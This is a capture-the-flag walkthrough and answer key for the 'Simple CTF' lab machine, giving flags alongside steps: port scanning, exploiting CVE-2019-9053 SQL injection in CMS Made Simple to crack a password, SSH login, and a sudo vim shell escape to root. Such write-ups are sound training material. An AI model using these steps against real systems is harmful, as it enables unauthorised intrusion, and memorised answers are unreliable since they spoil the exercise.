__________________Simple_CTF_________________
|-----------------Write By Mr_Sami-----------|
|                                            |
|                                            |
|____________________________________________|

|Task 1|------Simple CTF----------------------
Deploy the machine and attempt the questions!
---------------Answer the questions below----
How many services are running under port 1000?
Answer: 2  
Solution: sudo nmap -sS -sC -sV -A Target-Ip -v
____________________________________________________
What is running on the higher port?
Answer: 22
____________________________________________________
What's the CVE you're using against the application? 
Answer: CVE-2019-9053
Solution: Search directory by gobuster then you get
          "/simple" then look at the web page then 
          you get "© Copyright 2004 - 2023 - CMS Made Simple
          This site is powered by CMS Made Simple version 2.2.8"
          then search on google cms made simple exploit your get
          at first from google database. copy the cve code!!!!
____________________________________________________
To what kind of vulnerability is the application vulnerable?
Answer: sqli
solution: read on cve then you get "sqli"
____________________________________________________
What's the password?
Answer: secret
solution: copy cve exploit python code then paste then do
          this python3 exploit.py -u http://IP/simple/ --crack -w /usr/share/wordlists/rockyou.txt then you get user name and password maybe it can take 15min-20min to finish!
______________________________________________________
Where can you login with the details obtained?
Answer: ssh
solution: we know if we get username and password we can login by
          ssh port!!!
_____________________________________________________
What's the user flag?
Answer: G00d j0b, keep up!
solution: login by "ssh username@IP -p 2222" then use ls command
          then we get user.txt file then use cat command "cat user.txt" 
_____________________________________________________
Is there any other user in the home directory? What's its name?
Answer: sunbath
solution: when use we use "pwd command we get /home/mitch" then  
          use "cd .." then use "ls" then we get "sunbath"

_____________________________________________________
What can you leverage to spawn a privileged shell?
Answer: vim
solution: when we said "sudo -l" vim
___________________________________________________
What's the root flag?
Answer: W3ll d0n3. You made it!
solution: use this command "sudo vim -c ':!/bin/sh'"
___________________________________________________